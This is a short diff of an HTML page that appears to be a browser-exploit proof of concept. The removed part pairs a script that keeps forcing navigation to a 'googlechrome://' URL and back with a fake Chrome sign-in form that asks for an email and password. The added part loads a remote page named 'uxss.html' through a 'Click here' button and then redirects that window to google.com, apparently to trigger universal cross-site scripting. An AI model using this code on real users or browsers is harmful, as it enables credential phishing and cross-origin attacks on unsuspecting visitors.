@@ -1,8 +1,9 @@
 
-	<script>
-	          setInterval(`x=document.location='googlechrome://about:about';`, 3);
-		  setInterval(`window.history.go(-1);`, 2000);
-	</script>
-Already a Chrome user? Sign in
-<li>Your e-mail <input type="search"></li>
-<li> Your password <input type="password"></li>
+<body>
+  <script>
+function go() {
+  var x = window.open('https://lbstyle.github.io/uxss.html');
+  setTimeout(function(){x.location = "https://www.google.com"}, 5000);
+};
+</script>
+<input onclick="go()" value="Click here" type="button" /></body>
